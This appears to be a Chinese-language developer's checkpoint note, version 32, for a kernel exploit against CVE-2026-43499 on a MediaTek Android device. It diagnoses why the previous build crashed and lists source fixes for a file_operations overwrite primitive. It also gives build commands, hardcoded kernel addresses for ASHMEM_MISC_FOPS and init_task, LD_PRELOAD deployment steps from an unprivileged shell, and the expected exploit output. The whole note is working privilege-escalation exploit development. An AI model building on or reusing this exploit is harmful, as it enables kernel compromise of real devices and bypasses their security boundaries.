# CHECKPOINT v32 — GhostLock shape=1 FOPS 覆写 (修复版)

> 日期: 2026-07-16
> 前一版: v31 (popsicle fork, 源码丢失, 已崩)
> 编译树: CyberMeowfia/IonStack/CVE-2026-43499/exploit

---

## v31 为什么崩 — 根因确认

v31_test1 用的 popsicle fork 二进制 (/tmp 编译, 源码已丢):
- fops.c 用 `fake_task` (喷的 slab 页) → 内核 PI chain walk 访问 task->pi_waiters 等垃圾 → SIGSEGV
- main.c 用裸 `ASHMEM_MISC_FOPS` (image 地址) → 非 direct-map

**v 系列 (v30) 从不崩的原因**: `def_task_val = text_addr(INIT_TASK)` — 一直用的真正 init_task。

**v25_pi shape=1 "失败"真相**: tree_pc=0 禁用了唯一会触发 rb_erase 的 tree_entry 路径。GhostLock 触发了 (calls=1 success=1) 但 rb_erase 没执行。不是 shape=1 不行。

---

## v32 修复

| 修复点 | 文件 | 行 | 旧值 | 新值 |
|--------|------|-----|------|------|
| waiter→task | fops.c | 106 | `fake_task` | `canon_addr(INIT_TASK)` |
| write target | main.c | 560 | `ASHMEM_MISC_FOPS` | `canon_addr(ASHMEM_MISC_FOPS)` |

两处都已在此源码树中修复 (v30 级别的 task 安全性 + R 系列的 shape=1 写原语)。

---

## 编译信息

```bash
cd CyberMeowfia/IonStack/CVE-2026-43499/exploit
rm -rf build/
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang
```

- 文件: `preload_mtk_v32.so` (105216 bytes)
- SHA256: `cb79a34c631e90162a59af87f6b2b38332df98ad2a9fb3f59f591c8c23922728`
- 编译: 0 错误 0 警告
- 来源: CyberMeowfia 树 (非 popsicle fork)

---

## 关键地址

```
KIMAGE_TEXT_BASE:    0xffffffc008000000
ASHMEM_MISC_FOPS:    0xffffff80028e76e8  (canon_addr, direct map)
INIT_TASK (canon):   0xffffff800279bec0  (direct map)
FOPS-8 (parent):     0xffffff80028e76e0  (= target - 8)
```

---

## 部署和测试

```bash
# 部署 (rish 内):
bash /sdcard/Documents/matisse_backup_essentials/scripts/deploy.sh preload_mtk_v32.so

# 测试 (rish 内):
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10 2>&1 | \
  tee /sdcard/Documents/matisse_backup_essentials/logs/v32_test1.txt
```

### 期望输出
```
fops overwrite mode: GhostLock shape=1 → ASHMEM_MISC_FOPS
fops-stage enter uid=2000 pid=XXXXX
fops-fusion: forking page holder...
prepare: OK base=XXXXXXXX
fops-fusion: holder pid=XXXXX page OK ... reuse=1
fops-write target=ffffff80028e76e8 value=XXXXXXXX shape=1
direct-step overwrite_ashmem_fops attempt=1/1 ...
→ GhostLock 触发，手机不重启！
```

### ⚠️ 测试铁律
1. rish 内运行 (uid=2000 shell)
2. 部署后 sha256sum 验证
3. 重启后最多跑 2 次
4. 测试前关自动息屏
5. 不切后台/不开视频小窗
